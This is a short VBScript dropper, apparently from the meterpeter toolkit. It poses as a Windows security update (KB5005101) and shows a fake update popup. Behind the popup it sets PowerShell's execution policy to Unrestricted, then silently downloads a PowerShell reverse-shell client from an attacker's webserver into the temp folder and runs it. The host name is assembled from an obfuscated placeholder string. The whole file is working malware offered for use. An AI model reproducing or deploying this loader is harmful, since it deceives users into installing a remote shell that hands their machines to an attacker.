' Author: @r00t-3xp10it (ssa)
' Application: meterpeter v2.10.11 download crandle
' Description:
'   This VBS changes PS 'ExecutionPolicy' to 'UnRestricted', spawns a msgbox
'   pretending to be a security KB5005101 21H1 update, while downloads\executes
'   meterpeter client.ps1 (rev_tcp_shell) in background from attacker webserver.
' ---

dIm Char,Cmd,Layback
Char="@COLOMBO@"+"Buffer:VIRIATO@"+"@NAVIGATOR@"
Layback=rEpLaCe(Char, "@", ""):Cmd=rEpLaCe(Layback, "Buffer:", "")

set objshell = CreateObject("Wscript.Shell")
createobject("wscript.shell").popup "THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.", 5, "KB5005101 21H1 Update", 64
objShell.Run("cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser"), 0
objShell.Run("powershell.exe cd $Env:TMP;powershell.exe iwr -Uri http://"+Cmd+"/Update-KB5005101.ps1 -OutFile Update-KB5005101.ps1;powershell -File Update-KB5005101.ps1"), 0
}
